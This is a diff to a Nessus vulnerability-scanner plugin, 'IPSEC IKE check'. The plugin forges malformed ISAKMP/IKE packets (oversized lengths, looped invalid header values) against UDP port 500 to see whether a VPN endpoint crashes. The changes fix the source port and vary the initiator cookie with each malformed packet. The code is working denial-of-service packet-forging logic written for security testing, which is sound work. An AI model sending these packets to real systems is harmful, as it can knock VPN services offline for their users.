@@ -1,9 +1,18 @@
 #
-# This script was written by John Lampe...j_lampe@bellsouth.net
+# This script was written by John Lampe...jwlampe@nessus.org
 #
 # Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
 #      Erik Anderson <eanders@carmichaelsecurity.com>
 #      Added RFC Reference
+#
+# Bert Salaets: Some (older, pre-NAT-T) ISAKMP implementations won't respond on
+#	UDP packets with src.port != 500
+#	Some implementations will drop packets with initiator cookie set to the
+#	same value as a previously received packet (within a certain time frame)
+#	MV should be 0x10 (was 0x04)
+#
+# John Lampe: It's also interesting to note that some implementations will *accept*
+# packets with (srcport != 500) and reply to those packets with (srcport == dstport == 500)
 #
 # See the Nessus Scripts License for details
 #
@@ -11,7 +20,7 @@
 if(description)
 {
  script_id(10941);
- script_version("$Revision: 1.7 $");
+ script_version("$Revision: 1.11 $");
 
  name["english"] = "IPSEC IKE check";
  script_name(english:name["english"]);
@@ -21,11 +30,8 @@ if(description)
 bogus IKE requests.
 
 An attacker may use this flaw to disable your VPN remotely
-
 Solution: Contact your vendor for a patch
-
 Reference : See RFC 2409
-
 Risk factor : High";
 
  script_description(english:desc["english"]);
@@ -49,7 +55,7 @@ Risk factor : High";
 function calc_data() {
     ISAKMP_HEADER = IC + RC + NP + MV + ET + IF + MI + LEN;
     SA_HEADER = SA_NP + RES + PLEN + DOI + SIT;
-    PROP_HEADER = P_NP + P_RES + P_PLEN + P_NUM + PID + SPI_SZ + T_NUM;
+    PROP_HEADER = P_NP + P_RES + P_PLEN + P_NUM + PID + SPI_SZ + TOT_T_NUM;
     T_PAY1 = T_NP + T_RES + T_PLEN + T_NUM + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2 + T_FLAGS3
 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 +  T_AC6 + T_ALEN + T_AV6;
 
@@ -69,7 +75,8 @@ T_ALEN + T_AV6;
 
 
 function bada_bing (blat) {
-  srcport = rand() % 65535;
+  #srcport = rand() % 65535;
+  srcport = 500;
   UDP_LEN = strlen(blat) + 8;
   ip = forge_ip_packet(ip_v : 4,
                        ip_hl : 5,
@@ -106,7 +113,7 @@ srcport = 500;
 
 #------ISAKMP header-----#
 
-IC = raw_string (0xFF, 0x00, 0xFE, 0x01, 0xFD, 0x02, 0xFC, 0x03);    #8 byte Initiator cookie
+IC = raw_string (0xFF, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC, 0x03);    #8 byte Initiator cookie
 RC = raw_string (0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);    #8 byte Responder cookie
 
 NP = raw_string (0x01);                                              #Next payload = 1 = Security Association
@@ -159,9 +166,9 @@ P_PLEN = raw_string(0x00,0x74);                                      # Proposal 
 P_NUM = raw_string(0x01);                                            # proposal number
 PID = raw_string(0x01);                                              # protocol ID = 1 = proto_isakmp
 SPI_SZ = raw_string(0x00);                                           # SPI size
-T_NUM = raw_string(0x08);                                            # number of transforms
+TOT_T_NUM = raw_string(0x08);                                            # number of transforms
 
-PROP_HEADER = P_NP + P_RES + P_PLEN + P_NUM + PID + SPI_SZ + T_NUM;
+PROP_HEADER = P_NP + P_RES + P_PLEN + P_NUM + PID + SPI_SZ + TOT_T_NUM;
 
 
 
@@ -258,6 +265,7 @@ NON_PAY = NON_NP + NON_RES + NON_PLEN + TEST;
 
 #--------FALSE POSITIVE REDUCTION PRELIM----#
 # Disclaimer: I can't verify that _ALL_ IPSEC servers will reply to the packet below
+#Bert Salaets: AND THEY WON'T! Some will not answer on packets with UDP srcport != 500 -> fixed
 
 stored = MV;
 stored2 = ET;
@@ -280,16 +288,18 @@ ip = forge_ip_packet(                    ip_v : 4,
 
 
 udpip = forge_udp_packet(                        ip : ip,
-                                                 uh_sport : 1500,
+                                                 uh_sport : 500,
                                                  uh_dport : 500,
                                                  uh_ulen : oneoff + 8,
                                                  data : blat);
 
-filter = string("udp and src host ", get_host_ip(), " and dst host " , this_host());
+filter = string("udp and src host ", get_host_ip(), " and dst host " , this_host(), " and dst port 500 and src port 500");
 live = send_packet(udpip, pcap_active:TRUE, pcap_filter:filter);
 foo = strlen(live);
-if (foo < 20) exit(0);
-MV = raw_string(0x04);
+if (foo < 20) 
+	exit(0);
+
+MV = stored;
 ET = stored2;
 
 # END FALSE POSITIVE PRELIM
@@ -301,16 +311,18 @@ start_denial();
 
 stored = LEN;
 LEN = raw_string(0xFF,0xFF,0xFF,0xFF);
+IC = raw_string (0xFF, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC, 0x03); #Change the initiator cookie with each new attack....
 blat = calc_data();
-bada_bing(blat);
+bada_bing(blat:blat);
 LEN = stored;
 
 
 stored = SA_NP;
 for (mu=0; mu<14; mu = mu + 1) {
   SA_NP = raw_string(mu);
+  IC = raw_string (0x01, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC) + raw_string(mu);
   blat = calc_data();
-  bada_bing(blat);
+  bada_bing(blat:blat);
 }
 SA_NP = stored;
 
@@ -319,8 +331,9 @@ SA_NP = stored;
 stored = RES;
 for (mu=0; mu<128; mu = mu + 16) {
     RES = raw_string(mu);
+    IC = raw_string (0x02, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC) + raw_string(mu);
     blat = calc_data();
-    bada_bing(blat);
+    bada_bing(blat:blat);
 }
 RES = stored;
 
@@ -330,7 +343,8 @@ for (mu=0; mu < 255; mu = mu + 16) {
     for (delta=0; delta < 255; delta = delta + 16) {
         PLEN = raw_string(mu) + raw_string(delta);
         blat = calc_data();
-        bada_bing(blat);
+        IC = raw_string (0x03, 0x00, 0xFE, 0x01, 0xFD, 0x12) + raw_string(delta) + raw_string(mu);
+        bada_bing(blat:blat);
     }
 }
 PLEN = stored;
@@ -345,9 +359,10 @@ for (mu=2; mu < 255; mu = mu * mu) {
   for (delta=2; delta < 255; delta = delta * delta) {
       for (sigma=2; sigma < 255; sigma = sigma * sigma) {
           for (gamma=2; gamma < 255; gamma = gamma * gamma) {
+              IC = raw_string (0x04, 0x00, 0xFE, 0x01, 0xFD) + raw_string(gamma) + raw_string(delta) + raw_string(mu);
               SIT = raw_string(mu) + raw_string(delta) + raw_string(sigma) + raw_string(gamma);
               blat = calc_data();
-              bada_bing(blat);
+              bada_bing(blat:blat);
           }
       }
   }
@@ -359,8 +374,9 @@ SIT = stored;
 stored = P_NP;
 for (mu=0; mu<128; mu = mu + 1) {
     P_NP = raw_string(mu);
+    IC = raw_string (0x05, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC) + raw_string(mu);
     blat = calc_data();
-    bada_bing(blat);
+    bada_bing(blat:blat);
 }
 P_NP = stored;
 
@@ -368,7 +384,7 @@ P_NP = stored;
 stored=IC;
 IC = raw_string(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00);
 blat = calc_data();
-bada_bing(blat);
+bada_bing(blat:blat);
 IC=stored;
 
 
@@ -377,23 +393,25 @@ stored2=RC;
 IC=raw_string(0x56,0x99,0xee,0xff,0x43,0x83,0x87,0x73);
 RC=raw_string(0x88,0x77,0x66,0x55,0x44,0x33,0x22,0x11);
 blat = calc_data();
-bada_bing(blat);
+bada_bing(blat:blat);
 IC=stored;
 RC=stored2;
 
 
 stored=MV;
 MV = raw_string(0x00);
+IC = raw_string (0x06, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC, 0x0D);
 blat = calc_data();
-bada_bing(blat);
+bada_bing(blat:blat);
 MV=stored;
 
 
 stored=ET;
 for (mu=0; mu<255; mu = mu + 1) {
   ET = raw_string(mu);
+  IC = raw_string (0x07, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC) + raw_string(mu);
   blat = calc_data();
-  bada_bing(blat);
+  bada_bing(blat:blat);
 }
 ET=stored;
 
@@ -401,8 +419,9 @@ ET=stored;
 stored=PID;
 for (mu=0; mu<128; mu = mu + 1) {
     PID = raw_string(mu);
+    IC = raw_string (0x08, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC) + raw_string(mu);
     blat = calc_data();
-    bada_bing(blat);
+    bada_bing(blat:blat);
 }
 PID=stored;
 
@@ -411,8 +430,9 @@ PID=stored;
 stored=SPI_SZ;
 for (mu=0; mu<128; mu = mu + 1) {
     SPI_SZ = raw_string(mu);
+    IC = raw_string (0x09, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC) + raw_string(mu);
     blat = calc_data();
-    bada_bing(blat);
+    bada_bing(blat:blat);
 }
 SPI_SZ = stored;
 
@@ -421,8 +441,9 @@ SPI_SZ = stored;
 stored = KE_NP;
 for (mu=0; mu < 128; mu = mu + 1) {
     KE_NP = raw_string(mu);
+    IC = raw_string (0x0A, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC) + raw_string(mu);
     blat = calc_data();
-    bada_bing(blat);
+    bada_bing(blat:blat);
 }
 KE_NP=stored;
 
@@ -431,8 +452,9 @@ KE_NP=stored;
 stored=NON_NP;
 for (mu=0; mu < 128; mu = mu + 1) {
     NON_NP = raw_string(mu);
+    IC = raw_string (0x0B, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC) + raw_string(mu);
     blat = calc_data();
-    bada_bing(blat);
+    bada_bing(blat:blat);
 }
 NON_NP = stored;
 
@@ -458,7 +480,7 @@ ip = forge_ip_packet(                    ip_v : 4,
 
 
 udpip = forge_udp_packet(                        ip : ip,
-                                                 uh_sport : 1500,
+                                                 uh_sport : 500,
                                                  uh_dport : 500,
                                                  uh_ulen : 8);
 filter = string("icmp and src host ", get_host_ip(), " and dst host " , this_host());
